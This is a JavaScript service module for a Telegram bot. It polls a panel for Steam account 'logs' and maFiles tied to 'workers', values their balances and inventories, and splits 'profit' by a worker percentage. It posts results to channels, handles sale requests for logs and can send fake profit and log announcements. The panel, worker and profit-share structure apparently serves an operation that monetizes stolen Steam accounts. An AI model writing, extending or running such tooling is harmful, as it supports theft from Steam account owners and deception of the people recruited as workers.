const { Input } = require("telegraf");
const SteamLog = require("../models/SteamLog");
const User = require("../models/User");
const { env } = require("../config/env");
const { logger } = require("../utils/logger");
const { pe, E, FALLBACK } = require("../utils/emoji");
const { renderSteamProfitImage } = require("../utils/steamImageRenderer");
const { renderSteamLogImage } = require("../utils/steamLogImageRenderer");
const {
  steamLogSellKeyboard,
  steamLogSellPendingKeyboard,
} = require("../keyboards/common");
const { getUserByTelegramId, getUserByPanelUsername } = require("./userService");
const { authCredentials } = require("./apiService");
const { sanitizeEntities } = require("./postService");
const {
  getSteamAccounts,
  createCheckValidTask,
  getSteamTaskById,
  getSteamInventory,
} = require("./steamApiService");

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function calcWorkerShare(total) {
  return Number((Math.max(0, Number(total) || 0) * Math.max(1, Math.min(100, env.steamWorkerPercent)) / 100).toFixed(2));
}

function accountBalanceUsd(account) {
  const steam = account?.steamInfo || {};
  if (steam.balanceUsd != null && Number.isFinite(Number(steam.balanceUsd))) {
    return Math.max(0, Number(steam.balanceUsd));
  }
  if (steam.balance != null && Number.isFinite(Number(steam.balance))) {
    return Math.max(0, Number(steam.balance));
  }
  return 0;
}

function accountInventoryUsd(account) {
  const total = account?.inventory?.price?.total ?? account?.accountPrice ?? 0;
  return Math.max(0, Number(total) || 0);
}

/** Общая сумма лога = баланс + цена инвентаря. */
function calcLogTotal(account) {
  return Number((accountBalanceUsd(account) + accountInventoryUsd(account)).toFixed(2));
}

function formatLogTotalUsd(total) {
  return `${Number(total || 0).toFixed(2).replace(".", ",")}$`;
}

function pushText(parts, text) {
  parts.push(String(text ?? ""));
}

function pushCustomEmoji(parts, entities, key) {
  const fb = FALLBACK[key] || "•";
  const id = E[key];
  if (id) {
    entities.push({
      type: "custom_emoji",
      offset: parts.join("").length,
      length: fb.length,
      custom_emoji_id: String(id),
    });
  }
  parts.push(fb);
}

function pushBold(parts, entities, text) {
  const value = String(text ?? "");
  entities.push({ type: "bold", offset: parts.join("").length, length: value.length });
  parts.push(value);
}

function pushCode(parts, entities, text) {
  const value = String(text ?? "");
  entities.push({ type: "code", offset: parts.join("").length, length: value.length });
  parts.push(value);
}

function buildValidLogCaption(account) {
  const balance = accountBalanceUsd(account);
  const inventory = accountInventoryUsd(account);
  const total = calcLogTotal(account);
  return [
    `${pe("celebrate")} <b>Поздравляем вас с новым логом!</b>`,
    "",
    `${pe("coins")} Общая сумма лога: <b>${formatLogTotalUsd(total)}</b>`,
    `└ Баланс: ${formatLogTotalUsd(balance)}`,
    `└ Инвентарь: ${formatLogTotalUsd(inventory)}`,
  ].join("\n");
}

/** Текст заявки на продажу с premium emoji через entities (надёжнее в каналах). */
function buildLogSaleChannelMessage(log, user) {
  const parts = [];
  const entities = [];
  const nick = user?.username ? `@${user.username}` : "—";
  const login = String(log.accountUsername || log.steamId || log.sourceId || "—");

  pushCustomEmoji(parts, entities, "package");
  pushText(parts, " ");
  pushBold(parts, entities, "Заявка на продажу лога");
  pushText(parts, "\n\n");

  pushCustomEmoji(parts, entities, "profile");
  pushText(parts, " Воркер: ");
  pushText(parts, nick);
  pushText(parts, "\n");

  pushCustomEmoji(parts, entities, "users");
  pushText(parts, " Telegram ID: ");
  pushCode(parts, entities, log.ownerTelegramId || "—");
  pushText(parts, "\n");

  pushCustomEmoji(parts, entities, "tag");
  pushText(parts, " Логин: ");
  pushCode(parts, entities, login);
  pushText(parts, "\n\n");

  pushCustomEmoji(parts, entities, "coins");
  pushText(parts, " Общая сумма: ");
  pushBold(parts, entities, formatLogTotalUsd(log.totalProfit));
  pushText(parts, "\n");
  pushText(parts, `└ Баланс: ${formatLogTotalUsd(log.balanceUsd)}\n`);
  pushText(parts, `└ Инвентарь: ${formatLogTotalUsd(log.inventoryUsd)}\n\n`);

  pushCustomEmoji(parts, entities, "file");
  pushText(parts, " ID лога: ");
  pushCode(parts, entities, log.sourceId || "—");
  pushText(parts, "\n");

  pushCustomEmoji(parts, entities, "time");
  pushText(parts, " Статус: ");
  pushBold(parts, entities, "ожидает");

  return {
    text: parts.join(""),
    entities: sanitizeEntities(entities),
  };
}

function snapshotAccountFields(account) {
  const balanceUsd = accountBalanceUsd(account);
  const inventoryUsd = accountInventoryUsd(account);
  return {
    balanceUsd,
    inventoryUsd,
    totalProfit: Number((balanceUsd + inventoryUsd).toFixed(2)),
    accountUsername: String(account?.username || account?.steamInfo?.nickname || ""),
    steamId: String(account?.steamInfo?.steamid || ""),
  };
}

async function submitLogSaleRequest(bot, log) {
  if (!env.steamLogSaleChannelId) {
    throw new Error("Не задан STEAM_LOG_SALE_CHANNEL_ID.");
  }
  if (log.saleStatus === "pending" || log.saleStatus === "done") {
    throw new Error("Заявка по этому логу уже отправлена.");
  }
  const user = log.ownerTelegramId ? await getUserByTelegramId(log.ownerTelegramId) : null;
  const { text, entities } = buildLogSaleChannelMessage(log, user);
  const sent = await bot.telegram.sendMessage(env.steamLogSaleChannelId, text, {
    entities,
  });
  log.saleStatus = "pending";
  log.saleChannelChatId = String(sent.chat.id);
  log.saleChannelMessageId = String(sent.message_id);
  await log.save();
  return sent;
}

async function pinDmMessage(bot, telegramId, messageId) {
  if (!telegramId || !messageId) return;
  try {
    await bot.telegram.pinChatMessage(telegramId, Number(messageId), {
      disable_notification: true,
    });
  } catch (error) {
    logger.warn("Steam DM pin failed", telegramId, error?.response?.description || error.message);
  }
}

function topItems(inventory) {
  return (inventory?.inventories || [])
    .flatMap((group) => group.items || [])
    .map((item) => ({
      icon: item.icon || item.icon_url || item.iconUrl || "",
      itemHashName: item.itemHashName || item.market_hash_name || item.hash_name || item.name || "Unknown item",
      price: Number(item.price || 0),
    }))
    .filter((item) => item.price > 0)
    .sort((a, b) => b.price - a.price)
    .slice(0, 7);
}

/** Классификация статуса лога как в панели: Валид / MaFile / прочее. */
function classifyAccountLog(row) {
  if (row?.isMaFile === true || /mafile/i.test(String(row?.status || ""))) return "mafile";
  const status = String(row?.status || "");
  if (/^(ok|valid|валид)$/i.test(status) && !row?.invalidDate) return "valid";
  if (/невалид|invalid/i.test(status)) return "invalid";
  return "other";
}

async function resolveOwnerTelegramId(row, fallbackTelegramId = "") {
  // Сначала владелец из лога (фильтр воркеров / owner), иначе кто опросил API.
  const telegram = row?.owner?.telegram;
  if (telegram) return String(telegram);
  const panelLogin = row?.owner?.username;
  if (panelLogin) {
    const user = await getUserByPanelUsername(panelLogin);
    if (user?.telegramId) return String(user.telegramId);
  }
  if (fallbackTelegramId) return String(fallbackTelegramId);
  return "";
}

async function waitTaskDone(taskId) {
  const started = Date.now();
  let result;
  while (Date.now() - started < Math.max(10000, env.steamTaskMaxWaitMs)) {
    result = await getSteamTaskById(taskId);
    if (["Done", "Failed", "Error"].includes(result?.state)) break;
    await sleep(Math.max(1000, env.steamTaskPollIntervalMs));
  }
  return result;
}

async function sendDmPhoto(bot, telegramId, imageBuffer, caption, filename, extra = {}) {
  if (!telegramId) return null;
  try {
    return await bot.telegram.sendPhoto(
      telegramId,
      Input.fromBuffer(imageBuffer, filename),
      { caption, parse_mode: "HTML", ...extra }
    );
  } catch (error) {
    logger.warn("Steam DM failed", telegramId, error?.response?.description || error.message);
    return null;
  }
}

async function postProfitChannel(bot, { imageBuffer, total, ownerTelegramId }) {
  if (!env.steamProfitChannelId) throw new Error("Не задан STEAM_PROFIT_CHANNEL_ID.");
  const user = ownerTelegramId ? await getUserByTelegramId(ownerTelegramId) : null;
  const owner = user && !user.isAnonymous ? `@${user.username || user.telegramId}` : "Аноним";
  const workerShare = calcWorkerShare(total);
  return bot.telegram.sendPhoto(
    env.steamProfitChannelId,
    Input.fromBuffer(imageBuffer, `steam-profit-${Date.now()}.png`),
    {
      caption: [
        `${pe("gift")} MaFile у ${owner}`,
        "",
        `${pe("coins")} Общий профит: $${total.toFixed(2)}`,
        `└ Доля воркера: $${workerShare.toFixed(2)} (${env.steamWorkerPercent}%)`,
      ].join("\n"),
      parse_mode: "HTML",
    }
  );
}

async function processValidLog(bot, log, account) {
  const imageBuffer = await renderSteamLogImage(account);
  const snap = snapshotAccountFields(account);
  const dm = await sendDmPhoto(
    bot,
    log.ownerTelegramId,
    imageBuffer,
    buildValidLogCaption(account),
    `steam-log-${log.sourceId}.png`,
    { reply_markup: steamLogSellKeyboard(log.sourceId).reply_markup }
  );
  if (dm) await pinDmMessage(bot, log.ownerTelegramId, dm.message_id);
  Object.assign(log, {
    status: "processed",
    logKind: "valid",
    ...snap,
    dmMessageId: dm ? String(dm.message_id) : "",
    dmChatId: dm ? String(dm.chat?.id || log.ownerTelegramId) : "",
    errorMessage: "",
  });
}

async function processMaFileLog(bot, log, account) {
  const steamId = String(account?.steamInfo?.steamid || log.sourceId);
  let inventory = null;
  let total = Number(account?.inventory?.price?.total || 0);
  try {
    const task = await createCheckValidTask(account.id || log.sourceId);
    const result = task?.id ? await waitTaskDone(task.id) : task;
    if (result?.state === "Done") {
      const sid = String(result?.steam?.steamid || result?.result?.steam?.steamid || steamId);
      inventory = await getSteamInventory(sid);
      total = Number(inventory?.price?.total || total);
      log.steamId = sid;
    }
  } catch (error) {
    logger.warn("MaFile inventory enrich failed", log.sourceId, error.message);
  }

  const workerShare = calcWorkerShare(total);
  const items = inventory ? topItems(inventory) : [];
  const imageBuffer = await renderSteamProfitImage({ items, total, workerShare });

  const dm = await sendDmPhoto(
    bot,
    log.ownerTelegramId,
    imageBuffer,
    `${pe("gift")} <b>Найден новый MaFile</b>\n<code>${account.username || account.steamInfo?.nickname || log.sourceId}</code>\n${pe("coins")} Инвентарь: $${total.toFixed(2)}`,
    `steam-mafile-${log.sourceId}.png`
  );

  let channelMessageId = "";
  try {
    const sent = await postProfitChannel(bot, {
      imageBuffer,
      total,
      ownerTelegramId: log.ownerTelegramId,
    });
    channelMessageId = String(sent.message_id);
  } catch (error) {
    logger.warn("MaFile channel post failed", error.message);
  }

  Object.assign(log, {
    status: "processed",
    logKind: "mafile",
    steamId: log.steamId || steamId,
    totalProfit: total,
    dmMessageId: dm ? String(dm.message_id) : "",
    channelMessageId,
    errorMessage: "",
  });
}

async function processAccountLog(bot, log, account) {
  try {
    const kind = classifyAccountLog(account);
    if (kind === "valid") {
      await processValidLog(bot, log, account);
    } else if (kind === "mafile") {
      await processMaFileLog(bot, log, account);
    } else {
      Object.assign(log, {
        status: "processed",
        logKind: kind,
        steamId: String(account?.steamInfo?.steamid || ""),
        totalProfit: Number(account?.inventory?.price?.total || 0),
        errorMessage: "",
      });
    }
  } catch (error) {
    Object.assign(log, {
      status: "failed",
      errorMessage: error?.response?.data?.message || error.message,
    });
    logger.error("Steam account log process failed", log.sourceId, log.errorMessage);
  }
  await log.save();
}

async function ingestAccountRows(bot, rows, fallbackTelegramId = "") {
  for (const account of rows) {
    const sourceId = String(account?.id || "");
    if (!/^\d+$/.test(sourceId)) continue;

    const kind = classifyAccountLog(account);
    // Только Валид и MaFile — Невалид и прочее не шлём в ЛС.
    if (kind !== "valid" && kind !== "mafile") continue;

    const existing = await SteamLog.findOne({ sourceId });
    if (existing) {
      // Тот же лог позже получил MaFile — отдельное уведомление.
      if (
        existing.logKind === "valid" &&
        kind === "mafile" &&
        existing.status === "processed"
      ) {
        existing.logKind = "mafile";
        existing.status = "new";
        existing.errorMessage = "";
        existing.ownerTelegramId =
          (await resolveOwnerTelegramId(account, fallbackTelegramId)) || existing.ownerTelegramId;
        await processMaFileLog(bot, existing, account);
        await existing.save();
      }
      continue;
    }

    const ownerTelegramId = await resolveOwnerTelegramId(account, fallbackTelegramId);
    const log = await SteamLog.create({
      sourceId,
      ownerTelegramId,
      status: "new",
      logKind: kind,
    });
    await processAccountLog(bot, log, account);
  }
}

async function pollPanelUser(bot, user) {
  if (!user?.panelUsername || !user?.panelPassword) return;
  try {
    const auth = await authCredentials(user.panelUsername, user.panelPassword);
    if (!auth?.token) return;
    const payload = await getSteamAccounts(auth.token, { offset: 0, limit: 50 });
    await ingestAccountRows(bot, payload?.rows || [], user.telegramId);
  } catch (error) {
    logger.warn(
      "Steam accounts poll failed",
      user.panelUsername,
      error?.response?.data?.message || error.message
    );
  }
}

async function pollOnce(bot) {
  try {
    const users = await User.find({
      isTeamMember: true,
      isBanned: { $ne: true },
      panelUsername: { $exists: true, $ne: "" },
      panelPassword: { $exists: true, $ne: "" },
    }).limit(100);

    if (!users.length) {
      // fallback: API key only
      const payload = await getSteamAccounts(null, { offset: 0, limit: 50 });
      await ingestAccountRows(bot, payload?.rows || []);
      return;
    }

    for (const user of users) {
      await pollPanelUser(bot, user);
    }
  } catch (error) {
    logger.error("Steam poll failed", error?.response?.data || error.message);
  }
}

async function recheckSteamId(bot, sourceId) {
  if (!/^\d+$/.test(String(sourceId || ""))) throw new Error("ID лога должен содержать только цифры.");
  const payload = await getSteamAccounts(null, { offset: 0, limit: 100 });
  const account = (payload?.rows || []).find((row) => String(row.id) === String(sourceId));
  if (!account) throw new Error("Лог не найден в /steam/accounts.");
  const ownerTelegramId = await resolveOwnerTelegramId(account);
  const log = await SteamLog.findOneAndUpdate(
    { sourceId: String(sourceId) },
    { status: "new", errorMessage: "", ownerTelegramId, logKind: classifyAccountLog(account) },
    { new: true, upsert: true, setDefaultsOnInsert: true }
  );
  await processAccountLog(bot, log, account);
  return log;
}

async function sendFakeSteamProfit(bot, { items, total, anonymous, ownerTelegramId }) {
  const workerShare = calcWorkerShare(total);
  return postProfitChannel(bot, {
    imageBuffer: await renderSteamProfitImage({ items, total, workerShare }),
    total,
    ownerTelegramId: anonymous ? null : ownerTelegramId,
  });
}

/** Фейк / тест карточки валид-лога в ЛС участника. */
async function sendFakeSteamLog(bot, { account, ownerTelegramId }) {
  if (!ownerTelegramId) throw new Error("Не указан получатель фейк-лога.");
  const sourceId = `fake-${Date.now()}`;
  const snap = snapshotAccountFields(account);
  const log = await SteamLog.create({
    sourceId,
    ownerTelegramId: String(ownerTelegramId),
    status: "processed",
    logKind: "valid",
    saleStatus: "none",
    ...snap,
  });
  const imageBuffer = await renderSteamLogImage(account);
  const dm = await sendDmPhoto(
    bot,
    ownerTelegramId,
    imageBuffer,
    buildValidLogCaption(account),
    `steam-log-fake-${Date.now()}.png`,
    { reply_markup: steamLogSellKeyboard(sourceId).reply_markup }
  );
  if (!dm) throw new Error("Не удалось отправить лог в ЛС (бот заблокирован или неверный ID).");
  await pinDmMessage(bot, ownerTelegramId, dm.message_id);
  log.dmMessageId = String(dm.message_id);
  log.dmChatId = String(dm.chat?.id || ownerTelegramId);
  await log.save();
  return dm;
}

function startSteamMonitor(bot) {
  pollOnce(bot);
  setInterval(() => pollOnce(bot), Math.max(15000, env.steamPollIntervalMs));
  logger.info("Steam monitor started");
}

module.exports = {
  startSteamMonitor,
  recheckSteamId,
  sendFakeSteamProfit,
  sendFakeSteamLog,
  submitLogSaleRequest,
  classifyAccountLog,
};
